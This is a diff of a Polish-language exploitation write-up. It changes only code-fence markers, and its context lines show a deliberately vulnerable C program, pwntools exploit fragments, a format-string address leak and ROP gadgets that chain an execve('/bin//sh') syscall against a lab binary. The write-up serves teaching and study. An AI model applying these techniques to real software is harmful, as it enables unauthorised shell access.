@@ -92,7 +92,7 @@ Pierwotne założenia kompilacji:
 
 Poniżej znajduje się kod podatnej aplikacji. Ten sam kod aplikacji został użyty we wszystkich atakach w tym opracowaniu. Podatnościami w przypadku tej aplikacji jest używanie funkcji `gets()` oraz `printf()`, a takżę bardzo niebezpieczna metoda `win`, która pozwala zdobyć shell-a. Celem ataków jest dostanie się do tej funkcji.
 
-```c=
+```c
 #include <stdio.h>
 #include <stdlib.h>
 
@@ -149,7 +149,7 @@ Jako że ASLR oraz PIE są wyłączone, adres funkcji `win` jest stały. Oznacza
 
 Kod prostego exploitu znajduje się poniżej.
 
-```python=
+```python
 #!/usr/bin/env python3
 
 from pwn import *
@@ -192,7 +192,7 @@ W przypadku tego ustawienia, asm skompilowanej aplikacji oparty jest na liczeniu
 
 Base addres można poznać uruchamiając aplikację w `gdb` i używając komendy `vvmap`. Adres bazowy to `0x56555000`. Offset do funkcji `win` rówieniż pobrałem za pomocą `gdb` używając komendy `disasseble win` - jest to wartość `0x11c9`.
 
-```python=
+```python
 #!/usr/bin/env python3
 
 from pwn import *
@@ -254,7 +254,7 @@ W takim przypadku, wszystkie segmenty pamięci są losowane. Skok do funkcji `wi
 
 Do wyleakowania adresów na stosie używam funkcji `printf`, która jest w stanie wypisać wartości ze stosu po zastosowaniu odpowiednich specyfikatórów - w tym przypadku jest to `%p`, ponieważ wyświetla ona wartści z `0x` na początku, co umożliwia wypisanie większej ilości stosu.
 
-```python=
+```python
 from pwn import *
 
 p = process('./vuln-2.o')
@@ -279,7 +279,7 @@ Po wypisaniu wartości okazało się, że 4 wartość to jeden z adresów w funk
 
 Zatem aby uzyskać adres `win` należy odjąć offset od zleakowanej instrukcji. Finalnie exploit wygląda następująco.
 
-```python=
+```python
 #!/usr/bin/env python3
 
 from pwn import *
@@ -362,7 +362,7 @@ PLIKI:
 
 W przypadku konfiguracji bez `PIE` odnalezienia adresów gadgetów jest trywialne. Sekcja text, w której znajduje się kod aplikacji jest stały. Gdgety który odnalazłem pozwalają mi umieścić argument `/bin//sh` w odpowiednie miejsce w pamięci, a także powalają mi ustawic wartości w rejestrach na takie, które są potrzeben do wykonania syscalla.
 
-```python=
+```python
 0x080793c4 : mov dword ptr [eax], edx ; ret
 0x08065abe : pop edx ; pop ebx ; pop esi ; ret
 0x0805bf75 : pop ebp ; mov eax, edx ; ret
@@ -377,7 +377,7 @@ W przypadku konfiguracji bez `PIE` odnalezienia adresów gadgetów jest trywialn
 Posługując się tymi gadgetami jestem w stanie stworzyć odpowiednie funkcje, które będą wykonywać różne czynności, typu ustawienie rejestru lub zapisanie wartości pod dany adres. Poniżej znajdują się odpowiednie funkcje. Do rejestrów których nie potrzebuję ustawiać, czyli `esi` oraz `ebp` wstawiam wartość `0xfadeface` - służyło to jedynie w celach debugowania, może to być równie dobrze 0.
 
 
-```python=
+```python
 def set_edx_ebx(edx,ebx):
     return p32(0x08065abe) + p32(edx) + p32(ebx) + p32(0xfadeface) 
 
@@ -405,7 +405,7 @@ Ostatnim elementem było odnalezienie odpowiedniego miejsca, w które mógłbym 
 
 Aby odnaleźć sekcję `bss` programu poslużyłem się dekompilatorem `Ghidra`. Każda sekcja zawsze jest wyrównana do 12 bitów. W dekompilatorze widać, że sekcja bss kończy się na adresie `0x080e8140`. Oznacza to, że pamięć od adresu `0x080e8144` jest wolna. Można to sprawdzić za pomocą komendy `hexdump 0x080e8144` w gdb.  Warto zauważyć, że w tej sekcji pamięci jest wiele wolnego miejsca, w tym przypadku znajduje się tam jeszcze `0xebc` wolnych byt-ów.
 
-```python=
+```python
 >>> 0x1000 - 0x144
 3772
 >>> hex(_)
@@ -417,7 +417,7 @@ Aby odnaleźć sekcję `bss` programu poslużyłem się dekompilatorem `Ghidra`.
 
 Kolejnym etapem było stworzenie shellcode, który po dodaniu odpowiedniego paddingu ustawia odpowiednie rejestry. Shellcode wywołuje odpowiednie funkcje zdefiniowane wcześniej.
 
-```python=
+```python
 shellcode = b''.join([
     b"A" * 28,
     write_to_mem(buffor, u32("/bin")),
@@ -434,7 +434,7 @@ shellcode = b''.join([
 
 Finalnie exploit prezentuje się następująco.
 
-```python=
+```python
 #!/usr/bin/env python3
 
 from pwn import *
@@ -514,7 +514,7 @@ W tym przypadku wartość `/bin//sh` zapisuję na stosie, a dokładnie w bufforz
 
 Gadgety które odnalazłem w tym  przypadku służą jedynie do ustawienia odpowiednich rejestrów, a mianowicie `exc`, `ebx` oraz `eax`.
 
-```python=
+```python
 0x0006a883 : add al, 0x8b ; inc eax ; pop eax ; ret
 0x0001fc5e : pop edx ; pop ebx ; pop esi ; ret
 0x0000301e : pop ebx ; ret 
@@ -527,7 +527,7 @@ Gadgety które odnalazłem w tym  przypadku służą jedynie do ustawienia odpow
 
 Aby wykorzystać te gadgety stworzyłem odpowiednie funkcje. W tym przypadku należy jednak dodać odpowiedni offset, który pozwoli odwołąć się do rzeczywistych adresów instrukcji w pamieci aplikacji.
 
-```python=
+```python
 def set_eax(eax):
     return p32(offset + 0x0006a883) + p32(eax)
 
@@ -549,7 +549,7 @@ def int80():
 
 Kolejnym etapem było stworzenie shellcodu. Składa się on z odpowiedniego paddingu, w którego w skład wchodzi argument `\bin\\sh` zakończony null bytem oraz odpowiednich instrukcji ustawiające odpowiednie rejestry.
 
-```python=
+```python
 shellcode = b''.join([
     p32(u32('/bin')),
     p32(u32('//sh')),
@@ -568,7 +568,7 @@ shellcode = b''.join([
 Ostatecznie exploit wygląda następująco.
 
 
-```python=
+```python
 #!/usr/bin/env python3
 
 from pwn import *
